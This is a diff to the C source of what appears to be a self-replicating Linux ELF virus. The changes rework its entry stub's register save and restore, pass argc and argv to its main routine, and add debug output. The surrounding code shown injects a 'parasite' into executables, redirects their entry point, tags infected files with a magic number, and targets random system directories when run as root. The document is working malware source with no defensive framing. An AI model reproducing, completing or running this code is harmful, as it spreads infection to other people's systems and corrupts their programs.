@@ -5,6 +5,8 @@
 #define LUCKY_NUMBER 7
 #define MAGIC_NUMBER 0x15D25 //thankz Mr. h0ffman
 
+#define __ASM__ asm __volatile__
+
 extern long real_start;
 extern long get_rip_label;
 
@@ -41,18 +43,20 @@ static const char *dirs[] = {
 
 
 _start()
-{	
+{
+	struct bootstrap_data bootstrap;
 	/*
 	 * Get argc, and char **argv
 	 */
-        asm __volatile__("mov 8(%%rbp), %%rcx " : "=c" (bootstrap.argc));
-        asm __volatile__("lea 16(%%rbp), %%rcx " : "=c" (bootstrap.argv));
+       	__ASM__ ("mov 0x08(%%rbp), %%rcx " : "=c" (bootstrap.argc));
+        __ASM__ ("lea 0x10(%%rbp), %%rcx " : "=c" (bootstrap.argv));
 	
 	/*
 	 * Save register state before executing parasite
 	 * code.
 	 */
-	asm __volatile__ (".globl real_start	\n"
+	__ASM__ (
+	 ".globl real_start	\n"
  	 "push %rsp	\n"
 	 "push %rbp	\n"
 	 "push %rax	\n"
@@ -66,23 +70,36 @@ _start()
 	 "push %r12	\n"
 	 "push %r13	\n"
 	 "push %r14	\n"
-	 "push %r15	\n"
+	 "push %r15	  ");
+	
+	/*
+	 * Load bootstrap pointer as argument to do_main()
+	 * and call it.
+	 */
+	__ASM__ ( 
+	 "leaq %0, %%rdi\n"
 	 "call do_main	\n"
-	 "pop %r15	\n"
-	 "pop %r14	\n"
-	 "pop %r13	\n"
-	 "pop %r12	\n"
-	 "pop %r11	\n"
-	 "pop %r10	\n"
-	 "pop %r9	\n"
-	 "pop %r8	\n"
-	 "pop %rdx	\n"
-	 "pop %rcx	\n"
-	 "pop %rbx	\n"
-	 "pop %rax	\n"
-	 "pop %rbp	\n"
-	 "pop %rsp	\n"
-	 "jmp end_code	\n"
+	);
+
+	/*
+	 * Restore register state
+	 */
+	asm __volatile__(
+	 "pop %%r15	\n"
+	 "pop %%r14	\n"
+	 "pop %%r13	\n"
+	 "pop %%r12	\n"
+	 "pop %%r11	\n"
+	 "pop %%r10	\n"
+	 "pop %%r9	\n"
+	 "pop %%r8	\n"
+	 "pop %%rdx	\n"
+	 "pop %%rcx	\n"
+	 "pop %%rbx	\n"
+	 "pop %%rax	\n"
+	 "pop %%rbp	\n"
+	 "pop %%rsp	\n"
+	 "jmp end_code	" :: "g"(bootstrap)
 	);
 }
 
@@ -172,6 +189,7 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          * Write first 64 bytes of original binary (The elf file header) 
          * [ehdr] 
          */
+	DEBUG_PRINT("Writing ehdr\n");
         if ((c = _write(ofd, mem, ehdr_size)) != ehdr_size) 
 		return -1;
         
@@ -179,13 +197,17 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          * Now inject the virus
          * [ehdr][virus]
          */
-        if ((c = _write(ofd, parasite, self->size - ehdr_size)) != self->size - ehdr_size) 
+	DEBUG_PRINT("Writing parasite\n");
+        if ((c = _write(ofd, parasite, self->size - ehdr_size)) != self->size - ehdr_size) {
+		DEBUG_PRINT("Wrote %d bytes (not %d)\n", c, self->size - ehdr_size);
 		return -1;
+	}
 
   	/*
          * Seek to end of tracer.o + PAGE boundary  
          * [ehdr][virus][pad]
          */
+	DEBUG_PRINT("Writing phdr's, text, data\n");
         uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize;
         if ((c = _lseek(ofd, offset, SEEK_SET)) != offset) 
 		return -1;
@@ -226,8 +248,9 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	 * Get size of parasite (self)
 	 */
         parasiteSize = self->size;
+	_printf("parasiteSize: %d\n", parasiteSize);
 	paddingSize = PAGE_ALIGN_UP(parasiteSize + JMPCODE_LEN);
-	
+	_printf("paddingSize: %d\n", paddingSize);
 	
 	
 	mem = target->mem;
@@ -256,8 +279,9 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
                 DEBUG_PRINT("Error, unable to locate text segment in target executable: %s\n", target->path);
                 return -1;
         }
-
+	_printf("origText: %x\n", origText);
 	ehdr->e_entry = origText - paddingSize + sizeof(ElfW(Ehdr));
+	_printf("new e_entry %x\n", ehdr->e_entry);
 	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
 
 	for (i = 0; i < ehdr->e_shnum; i++) 
@@ -280,7 +304,6 @@ int load_self(elfbin_t *elf)
 	int i;
 	Elf64_Addr _start_addr = get_rip() - ((char *)&get_rip_label - (char *)&_start);
 	elf->mem = (void *)((long)_start_addr & ~4095);
-	DEBUG_PRINT("mem: %x\n", _start_addr);
 	elf->ehdr = (Elf64_Ehdr *)elf->mem;
 	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
 	for (i = 0; i < elf->ehdr->e_phnum; i++) {
@@ -357,7 +380,7 @@ int check_criteria(char *filename)
 	_close(fd);
 	ehdr = (Elf64_Ehdr *)mem;
 	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
-	if (mem[0] != 0x7f && strncmp((char *)&mem[1], "ELF", 3)) 
+	if(_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0)
 		return -1;
 	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
 	if (magic == MAGIC_NUMBER) //already infected? Then skip this file
@@ -371,7 +394,7 @@ int check_criteria(char *filename)
 		return -1;
 
 }
-void do_main(void)
+void do_main(struct bootstrap_data *bootstrap)
 {
 	Elf64_Ehdr *ehdr;
 	Elf64_Phdr *phdr;
@@ -385,7 +408,7 @@ void do_main(void)
 	mode_t mode;
 	uint32_t rnum;
 	elfbin_t self, target;
-
+	_printf("bootstrap: %x\n", bootstrap);
 	dir = _getuid() != 0 ? "." : randomly_select_dir();
 	
 	DEBUG_PRINT("Infecting files in directory: %s\n", dir);
@@ -409,7 +432,8 @@ void do_main(void)
 		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
 			d = (struct linux_dirent64 *) (dbuf + bpos);
     			bpos += d->d_reclen - 1;
-			if (!_strcmp(d->d_name, &bootstrap.argv[0][2])) {
+			_printf("argv[0]: %s\n", bootstrap->argv[0]);
+			if (!_strcmp(d->d_name, &bootstrap->argv[0][2])) {
 				continue;
 			}
 			rnum = get_random_number(10);
